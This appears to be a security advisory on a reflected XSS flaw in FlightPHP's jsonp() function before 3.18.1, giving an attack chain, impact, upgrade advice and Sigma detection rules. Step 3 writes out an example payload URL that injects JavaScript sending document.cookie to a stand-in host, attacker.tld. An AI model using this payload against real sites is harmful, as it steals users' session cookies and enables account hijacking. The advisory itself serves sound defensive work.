---
title: FlightPHP Reflected XSS Vulnerability in jsonp()
slug: 2024-01-24-flightphp-xss
description: A reflected XSS vulnerability exists in FlightPHP versions prior to 3.18.1 due to improper validation of the jsonp query parameter in the Flight::jsonp() function, allowing attackers to inject arbitrary JavaScript leading to cookie theft, session hijacking, and data exfiltration.
date: "2024-01-24T12:00:00Z"
type: advisory
types:
  - advisory
severities:
  - high
tags:
  - reflected-xss
  - web-application
  - php
vendors:
  - Composer
products:
  - flightphp/core (< 3.18.1)
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1190
    technique_name: Exploit Public-Facing Application
references:
  - https://github.com/advisories/GHSA-fcx8-ph5r-mxr4
iocs:
  - type: url
    value: https://attacker.tld/c=
ioc_counts:
  url: 1
rules:
  - title: Detect FlightPHP JSONP XSS Attempt
    description: Detects potential exploitation attempts of the FlightPHP JSONP XSS vulnerability by identifying suspicious characters and JavaScript code within the jsonp query parameter in web server logs.
    platform: sigma
    severity: high
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - webserver
      - linux
  - title: Detect FlightPHP JSONP Callback Injection with fetch
    description: Detects potential exploitation attempts of the FlightPHP JSONP XSS vulnerability by identifying suspicious usage of fetch API for exfiltration within the jsonp query parameter.
    platform: sigma
    severity: medium
    tactics:
      - initial_access
    techniques:
      - T1190
    data_sources:
      - webserver
      - linux
rules_count: 2
---

FlightPHP versions prior to 3.18.1 are vulnerable to reflected cross-site scripting (XSS) due to insufficient validation of the `jsonp` query parameter within the `Flight::jsonp()` function. This function, intended for JSONP responses, directly concatenates the `jsonp` parameter into the `application/javascript` response body without ensuring it's a valid JavaScript identifier. This flaw allows an attacker to inject arbitrary JavaScript code, which then executes in the context of the victim's origin when the vulnerable endpoint is accessed via a `<script>` tag from an attacker-controlled page. The vulnerability was discovered by @Rootingg and patched in version 3.18.1, commit `b8dd23a`, by implementing a regex validation (`^[A-Za-z_$][\w$.]{0,127}$`) on the callback name.

## Attack Chain

1. An attacker identifies an application using FlightPHP versions prior to 3.18.1.
2. The attacker locates a route that calls the vulnerable `Flight::jsonp()` function.
3. The attacker crafts a malicious URL containing a `jsonp` parameter with an XSS payload. Example: `/api?jsonp=;window.xss=function(d){fetch('https://attacker.tld/c='+d)};xss(document.cookie);//`.
4. The attacker hosts a page containing a `<script>` tag that points to the vulnerable endpoint on the victim's domain, using the crafted malicious URL.
5. A user visits the attacker-controlled page in a browser.
6. The browser executes the injected JavaScript code from the `jsonp` parameter within the victim's origin.
7. The injected JavaScript steals sensitive information such as cookies, session tokens, or authenticated API responses.
8. The stolen data is exfiltrated to a domain controlled by the attacker (e.g., `attacker.tld`).

## Impact

Successful exploitation of this XSS vulnerability can lead to significant consequences. Attackers can steal user cookies, hijack user sessions, and exfiltrate authenticated API responses. This impacts any application using the vulnerable `Flight::jsonp()` function. The number of potential victims depends on the popularity and usage of applications built with the affected FlightPHP versions. Successful attacks allow attackers to impersonate users, access sensitive data, and potentially compromise the entire application.

## Recommendation

*   Upgrade FlightPHP to version 3.18.1 or later to incorporate the patch that validates the callback name.
*   Deploy the Sigma rule `Detect FlightPHP JSONP XSS Attempt` to your SIEM to detect potential exploitation attempts by monitoring for specific patterns in web server logs.
*   Monitor web server logs for requests containing suspicious characters or JavaScript code within the `jsonp` query parameter, referencing the example URL in the Attack Chain.
*   Implement strict input validation on all query parameters, especially those used in dynamic content generation, to prevent similar XSS vulnerabilities.
